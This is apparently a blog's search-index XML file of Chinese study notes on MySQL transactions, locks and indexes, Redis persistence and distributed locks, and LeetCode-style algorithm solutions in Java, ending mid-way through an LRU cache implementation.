<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql事务并发访问产生的问题和事务隔离机制</title>
      <link href="/2020/12/06/mysql%E4%BA%8B%E5%8A%A1/"/>
      <url>/2020/12/06/mysql%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h2><h3 id="1-read-uncommitted-未提交读"><a href="#1-read-uncommitted-未提交读" class="headerlink" title="1.read uncommitted 未提交读"></a>1.read uncommitted 未提交读</h3><p>事务可以读到其他事务未提交的数据，容易引发脏读</p><p><strong>脏读</strong>：</p><p>读到其他事务未提交的数据，如果另一方事务回滚就会引发错误。</p><h3 id="2-read-committed-提交读"><a href="#2-read-committed-提交读" class="headerlink" title="2.read committed 提交读"></a>2.read committed 提交读</h3><p>事务只能读到其他事务已经提交的数据，但是依然会发生不可重复读</p><p><strong>不可重复读</strong>：</p><p>如果有其他事务在本事务提交前进行修改操作并提交，两次读取数据不同，无法保证数据可靠</p><h3 id="3-repeatable-read-可重复读（innodb默认）"><a href="#3-repeatable-read-可重复读（innodb默认）" class="headerlink" title="3.repeatable read 可重复读（innodb默认）"></a>3.repeatable read 可重复读（innodb默认）</h3><p>事务只会读到该事务开始读到的结果，其他事务提交不会造成影响，两次读到结果相同，但是执行修改操作会是正确按照其他事务过的数据来操作。innodb的可重复读可以避免幻读。</p><p><strong>幻读</strong>：</p><p>一个事务进行删除/增加操作时候，另一个事务进行update操作，使得另一个事务影响的行数比预计多一行/少一行</p><h3 id="4-serializable"><a href="#4-serializable" class="headerlink" title="4.serializable"></a>4.serializable</h3><p> 所有操作都会加锁，最高级别的事务隔离</p><img src="https://s3.ax1x.com/2020/12/06/DjsgRH.png" alt="DjsgRH.png" border="0">]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql锁-myisam与innodb</title>
      <link href="/2020/12/06/mysql%E9%94%81/"/>
      <url>/2020/12/06/mysql%E9%94%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>共享锁（读锁 select操作），排他锁（写锁，更新操作）</p><p>在加上写锁时，无法进行读写操作，加上读锁时，可以进行读操作但是不能进行写操作</p></blockquote><h2 id="myisam"><a href="#myisam" class="headerlink" title="myisam"></a>myisam</h2><p>默认表级锁，不支持行级锁</p><p>只要对表中某个范围数据进行写操作，其他范围也无法进行读写操作</p><p><strong>适用场景</strong></p><blockquote><p>频繁执行全表count语句(myisam保存行数)<br>对数据进行增删改的频率不高，查询非常频繁<br>没有事务</p></blockquote><h2 id="innodb"><a href="#innodb" class="headerlink" title="innodb"></a>innodb</h2><p>默认行级锁，也支持表级锁</p><p>直接进行select不会加读锁，需要后面加上lock in share mode</p><p>对表中某个范围数据进行写操作，默认行级锁，其他范围可以进行读写操作</p><blockquote><p>不走索引的时候，用的是表级锁，整个表会被锁住</p></blockquote><p><strong>适用场景</strong></p><blockquote><p>数据增删改查都相当频繁<br>可靠性要求比较高，要求支持事务</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql索引</title>
      <link href="/2020/12/06/mysql%E7%B4%A2%E5%BC%95/"/>
      <url>/2020/12/06/mysql%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<h2 id="聚簇索引与非聚簇索引"><a href="#聚簇索引与非聚簇索引" class="headerlink" title="聚簇索引与非聚簇索引"></a>聚簇索引与非聚簇索引</h2><p>举例参考自<a href="https://blog.csdn.net/qq_20143059/article/details/82809712" target="_blank" rel="noopener">https://blog.csdn.net/qq_20143059/article/details/82809712</a></p><p>innodb中索引与数据一起存放到.idb，mylsam则是分开存放到.myi和.myd（索引存放）</p><h3 id="聚簇索引"><a href="#聚簇索引" class="headerlink" title="聚簇索引"></a>聚簇索引</h3><p>一个表只能有一个聚簇索引，是innodb的特性，无法手动添加innodb引擎的聚簇索引</p><p><strong>innodb</strong>：</p><p>1) 有主键时，根据主键创建聚簇索引<br>2)  没有主键时，会用一个唯一且不为空的索引列做为主键，成为此表的聚簇索引<br>3) 如果以上两个都不满足那innodb自己创建一个虚拟的聚集索引</p><blockquote><p>聚簇索引直接指向数据，innodb创建的普通索引都是指向聚簇索引</p></blockquote><p>举例：</p><p><img src="https://s3.ax1x.com/2020/12/06/DXOzND.png" alt="DXOzND.png"></p><blockquote><p>聚簇索引</p></blockquote><p><img src="https://s3.ax1x.com/2020/12/06/DXXMgs.png" alt="DXXMgs.png"></p><blockquote><p>innodb中普通索引指向聚簇索引</p></blockquote><img src="https://s3.ax1x.com/2020/12/06/DXXUC4.png" alt="DXXUC4.png" border="0"><h3 id="非聚簇索引"><a href="#非聚簇索引" class="headerlink" title="非聚簇索引"></a>非聚簇索引</h3><p>非聚簇索引存放的是地址</p><img src="https://s3.ax1x.com/2020/12/06/DXvgcd.png" alt="DXvgcd.png" border="0"><h2 id="联合索引的最左匹配原则"><a href="#联合索引的最左匹配原则" class="headerlink" title="联合索引的最左匹配原则"></a>联合索引的最左匹配原则</h2><p>1.在使用联合索引时候，如果创建index（colA，colB），在查询语句中使用where colA=？ and colB=？会走索引，where colA=？会走索引，但是使用where colB=？就不会走索引</p><p>2.mysql会一直向右匹配直到遇到范围查询（&gt;、&lt;,between、like)就停止匹配，比如a=3 and b=4 and c&gt;5 and d=6如果建立（a,b,c,d)顺序的索引，d是用不到索引的，如果建立（a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。<br>3.=和in可以乱序，比如a=1 and b=2 and c=3建立（a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式.</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis持久化与查询以及异步队列和分布式锁实现</title>
      <link href="/2020/12/06/redis%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8E%E6%9F%A5%E8%AF%A2%E4%BB%A5%E5%8F%8A%E5%BC%82%E6%AD%A5%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0/"/>
      <url>/2020/12/06/redis%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8E%E6%9F%A5%E8%AF%A2%E4%BB%A5%E5%8F%8A%E5%BC%82%E6%AD%A5%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="redis查询数据"><a href="#redis查询数据" class="headerlink" title="redis查询数据"></a>redis查询数据</h2><h3 id="keys-pattern"><a href="#keys-pattern" class="headerlink" title="keys [pattern]"></a>keys [pattern]</h3><p>KEYS * 匹配数据库中所有key</p><p>小量数据还好，但是keys [pattern]如果遇到大量数据会对服务器造成不小负担，这个命令会逐条打印，一次性返回所有匹配值，没有限制大小，一次性打印几w数据看起来会很头疼，一般prod环境都会禁用。</p><h3 id="SCAN-cursor-pattern-count"><a href="#SCAN-cursor-pattern-count" class="headerlink" title="SCAN cursor [pattern] count"></a>SCAN cursor [pattern] count</h3><p>每次都会返回少量数据，可用于prod环境。cursor为游标，第一次为0，后面迭代会依赖前面返回的游标，当游标重新返回0的时候说明迭代结束。</p><p>每次返回数据不会严格按照count的数量，游标也有可能在上次返回的前面（也就是数据可能会有重复），需要把数据放入set去重。</p><p><a href="https://imgchr.com/i/DXZxi9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/12/06/DXZxi9.png" alt="DXZxi9.png"></a></p><h2 id="redis分布式锁"><a href="#redis分布式锁" class="headerlink" title="redis分布式锁"></a>redis分布式锁</h2><p>可以利用redis键值有效时常来设置分布式锁</p><blockquote><p>set key value 【EX seconds】【PX milliseseconds】【nx】【xx】</p></blockquote><p>ex为过期时间 单位为秒，px单位为毫秒</p><p>nx只有键不存在才进行操作 xx只有键存在才进行操作</p><p>创建成功返回OK</p><blockquote><p>在代码中设置有时效的键值，如果键不存在则创建成功，说明该部分逻辑可以执行，否则说明键值存在，该部分被占用</p></blockquote><p>在实际当中，键值过期时间需要通过压测来进行确认</p><blockquote><p>为了防止缓存击穿（大量键值同时失效，对服务器造成负担），过期时间会加上一个随机值</p></blockquote><h2 id="redis异步队列"><a href="#redis异步队列" class="headerlink" title="redis异步队列"></a>redis异步队列</h2><blockquote><p>blpop/brpop key timout 阻塞直到队列有消息执行lpush/rpush或者超时 </p></blockquote><p>属于点对点，只有给一个消费者</p><blockquote><p>pub/sub 主题订阅模式 publish 【信息名】【信息】  subscribe 【信息名】</p></blockquote><p>publish发布，subscribe订阅，</p><p>消息是无状态的，无法保证可达，对于生产者是即发即失，这个问题一般还是使用专业消息队列如kafka</p><h2 id="redis持久化"><a href="#redis持久化" class="headerlink" title="redis持久化"></a>redis持久化</h2><blockquote><p>redis作为内存数据库，一旦重启数据就会丢失，redis4.0之后默认配置为rdb做全量备份，aof做增量备份</p><p>aof-use-rdb-preamble yes</p></blockquote><h3 id="rdb-快照"><a href="#rdb-快照" class="headerlink" title="rdb(快照)"></a>rdb(快照)</h3><p><strong>save</strong>保存redis快照文件</p><p>save会阻塞进程 所以一般使用<strong>bgsave</strong>，会fork一个进程， 之后就会在redis备份目录生成dump.rdb</p><p>恢复数据只需要把dump.rdb文件mv到安装目录并且启动即可</p><p>在redis.config中配置<strong>save</strong>命令</p><blockquote><p>文件小，恢复快，无法保存近一次快照后的数据</p></blockquote><h3 id="aof（append-only-file）持久化：保存写状态"><a href="#aof（append-only-file）持久化：保存写状态" class="headerlink" title="aof（append-only-file）持久化：保存写状态"></a>aof（append-only-file）持久化：保存写状态</h3><p>在redis.conf文件中修改<strong>appendonly</strong>为yes</p><p>重启之后会生成<strong>appendonly.aof</strong></p><p>保存的是每个redis命令</p><blockquote><p>bgrewriteaof 用于创建当前aof文件的体积优化版，因为aof会保存所有操作，所以需要优化 </p></blockquote><p>恢复数据与rdb一样，将生成的aof文件移动到安装目录，并且重启即可</p><blockquote><p>文件大，恢复慢，适合保存增量数据</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> nosql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法小记</title>
      <link href="/2020/07/22/%E7%AE%97%E6%B3%95/"/>
      <url>/2020/07/22/%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划问题"><a href="#动态规划问题" class="headerlink" title="动态规划问题"></a>动态规划问题</h2><p>动态规划问题可以视作为带备忘录的暴力迭代，这类问题存在重叠子问题，动态规划问题一定具有最优子结构，通过子问题的最值得出原问题的最值。要符合「最优子结构」，子问题间必须互相独立。</p><blockquote><p>只有列出正确的状态转换方程才能正确的穷举</p></blockquote><p><strong>例题：</strong></p><p><a href="https://leetcode-cn.com/problems/house-robber/" target="_blank" rel="noopener"> 打家劫舍</a></p><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你在不触动警报装置的情况下，能够偷窃到的最高金额。</p><p><strong>示例 1</strong>:</p><pre><code>输入: [1,2,3,1]输出: 4</code></pre><p>解释: 偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。<br>偷窃到的最高金额 = 1 + 3 = 4 。</p><p>dp问题关键，寻找状态转移方程，<em>f</em>(<em>k</em>) = max(<em>f</em>(<em>k</em> – 2) + A， <em>f</em>(<em>k</em> – 1))</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">rob</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> premax <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> curmax <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token operator">:</span>nums<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> curmax<span class="token punctuation">;</span>            curmax <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>premax<span class="token operator">+</span>x<span class="token punctuation">,</span>curmax<span class="token punctuation">)</span><span class="token punctuation">;</span>            premax <span class="token operator">=</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> curmax<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="子序列问题模板"><a href="#子序列问题模板" class="headerlink" title="子序列问题模板"></a>子序列问题模板</h3><p>子序列是不一定连续的数组内容</p><pre><code>int n = array.length;int[] dp = new int[n];for (int i = 1; i &lt; n; i++) {    for (int j = 0; j &lt; i; j++) {        dp[i] = 最值(dp[i], dp[j] + ...)    }}</code></pre><pre><code>int n = arr.length;int[][] dp = new int[n][n];for (int i = 0; i &lt; n; i++) {    for (int j = 0; j &lt; n; j++) {        if (arr[i] == arr[j])             dp[i][j] = dp[i][j] + ...        else            dp[i][j] = 最值(...)    }}</code></pre><h2 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h2><p>回溯算法有固定的模板，回溯相当于是复杂的暴力穷举.</p><p>最简单的例子是123有多少种排序，第一步固定首位是1，后面选择2，第三位是3；或者第二位是3第三位是2；然后回头重新选择第一位。</p><p><strong>例题：</strong></p><p><a href="https://leetcode-cn.com/problems/permutations/" target="_blank" rel="noopener">全排列</a></p><p>给定一个 <strong>没有重复</strong> 数字的序列，返回其所有可能的全排列。</p><pre><code>输入: [1,2,3]输出:[  [1,2,3],  [1,3,2],  [2,1,3],  [2,3,1],  [3,1,2],  [3,2,1]]</code></pre><p>回溯算法的模板</p><pre><code>result = []def backtrack(路径, 选择列表):    if 满足结束条件:        result.add(路径)        returnfor 选择 in 选择列表:    做选择    backtrack(路径, 选择列表)    撤销选择</code></pre><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">permute</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> rs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">backtrack</span><span class="token punctuation">(</span>rs<span class="token punctuation">,</span>list<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> rs<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">backtrack</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> rs<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> list<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>            rs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span>nums<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">backtrack</span><span class="token punctuation">(</span>rs<span class="token punctuation">,</span>list<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>                list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><p>滑动窗口算法的思路是这样：</p><p>(此处参考了<a href="https://github.com/labuladong/fucking-algorithm" target="_blank" rel="noopener">https://github.com/labuladong/fucking-algorithm</a>)</p><p>1、我们在字符串 S 中使用双指针中的左右指针技巧，初始化 left = right = 0，把索引闭区间 [left, right] 称为一个「窗口」。</p><p>2、我们先不断地增加 right 指针扩大窗口 [left, right]，直到窗口中的字符串符合要求（包含了 T 中的所有字符）。</p><p>3、此时，我们停止增加 right，转而不断增加 left 指针缩小窗口 [left, right]，直到窗口中的字符串不再符合要求（不包含 T 中的所有字符了）。同时，每次增加 left，我们都要更新一轮结果。</p><p>4、重复第 2 和第 3 步，直到 right 到达字符串 S 的尽头。</p><blockquote><p>抽象模板</p></blockquote><pre><code>int left = 0, right = 0;while (right &lt; s.size()) {    window.add(s[right]);    right++;    while (valid) {        window.remove(s[left]);        left++;    }}</code></pre><p><strong>例题：</strong></p><p><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/" target="_blank" rel="noopener"> 无重复字符的最长子串</a></p><p>给定一个字符串，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><p><strong>示例 1:</strong></p><pre><code>输入: &quot;abcabcbb&quot;输出: 3 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: &quot;bbbbb&quot;输出: 1解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</code></pre><p><strong>示例 3:</strong></p><pre><code>输入: &quot;pwwkew&quot;输出: 3解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</code></pre><p>滑动窗口</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Set<span class="token operator">&lt;</span>Character<span class="token operator">></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> rs <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>temp<span class="token operator">&lt;</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                temp<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp <span class="token operator">-</span> i <span class="token operator">></span> rs<span class="token punctuation">)</span> rs <span class="token operator">=</span> temp<span class="token operator">-</span>i<span class="token punctuation">;</span>            set<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> rs<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><p>一类是「快慢指针」，一类是「左右指针」。前者解决主要解决链表中的问题，比如典型的判定链表中是否包含环；后者主要解决数组（或者字符串）中的问题，比如二分查找。</p><blockquote><p>快慢指针一般都初始化指向链表的头结点 head，前进时快指针 fast 在前，慢指针 slow 在后，巧妙解决一些链表中的问题。</p></blockquote><h2 id="LRU缓存"><a href="#LRU缓存" class="headerlink" title="LRU缓存"></a>LRU缓存</h2><p>计算机的缓存容量有限，如果缓存满了就要删除一些内容，给新内容腾位置。</p><h4 id="LRU缓存-1"><a href="#LRU缓存-1" class="headerlink" title="LRU缓存"></a><a href="https://leetcode-cn.com/problems/lru-cache-lcci/" target="_blank" rel="noopener">LRU缓存</a></h4><p>设计和构建一个“最近最少使用”缓存，该缓存会删除最近最少使用的项目。缓存应该从键映射到值(允许你插入和检索特定键对应的值)，并在初始化时指定最大容量。当缓存被填满时，它应该删除最近最少使用的项目。</p><p>它应该支持以下操作： 获取数据 get 和 写入数据 put 。</p><p>获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。<br>写入数据 put(key, value) - 如果密钥不存在，则写入其数据值。当缓存容量达到上限时，它应该在写入新数据之前删除最近最少使用的数据值，从而为新的数据值留出空间。</p><p><strong>示例:</strong></p><pre><code>LRUCache cache = new LRUCache( 2 /* 缓存容量 */ );cache.put(1, 1);cache.put(2, 2);cache.get(1);       // 返回  1cache.put(3, 3);    // 该操作会使得密钥 2 作废cache.get(2);       // 返回 -1 (未找到)cache.put(4, 4);    // 该操作会使得密钥 1 作废cache.get(1);       // 返回 -1 (未找到)cache.get(3);       // 返回  3cache.get(4);       // 返回  4</code></pre><blockquote><p>实现LRU，需要双链表和哈希表</p></blockquote><p>LRU需要查找快，删除快，有顺序，哈希表查找删除快但是没有顺序，双链表有顺序但是查找慢，结合一下哈希链表，Map&lt;Integer,Node&gt;.</p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">LRUCache</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//定义双向链表节点</span>    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> key<span class="token punctuation">;</span>        <span class="token keyword">int</span> val<span class="token punctuation">;</span>        node pre<span class="token punctuation">;</span>        node next<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">node</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> val<span class="token punctuation">;</span>            pre <span class="token operator">=</span> null<span class="token punctuation">;</span>            next <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> capacity<span class="token punctuation">;</span>    <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> node<span class="token operator">></span> map<span class="token punctuation">;</span>    <span class="token keyword">private</span> node head<span class="token punctuation">;</span>    <span class="token keyword">private</span> node tail<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">LRUCache</span><span class="token punctuation">(</span><span class="token keyword">int</span> capacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>capacity <span class="token operator">=</span> capacity<span class="token punctuation">;</span>        map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">node</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tail <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">node</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        head<span class="token punctuation">.</span>next <span class="token operator">=</span> tail<span class="token punctuation">;</span>        tail<span class="token punctuation">.</span>pre <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        node n <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        n<span class="token punctuation">.</span>pre<span class="token punctuation">.</span>next <span class="token operator">=</span> n<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        n<span class="token punctuation">.</span>next<span class="token punctuation">.</span>pre <span class="token operator">=</span> n<span class="token punctuation">.</span>pre<span class="token punctuation">;</span>        <span class="token function">moveToTail</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> n<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//直接调用get方法，如果存在，get会直接移动到最后，这里修改数值就行</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>val <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//如果不存在就创建，超出容量则去头</span>        node node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">node</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">moveToTail</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> capacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>            map<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            head<span class="token punctuation">.</span>next <span class="token operator">=</span> 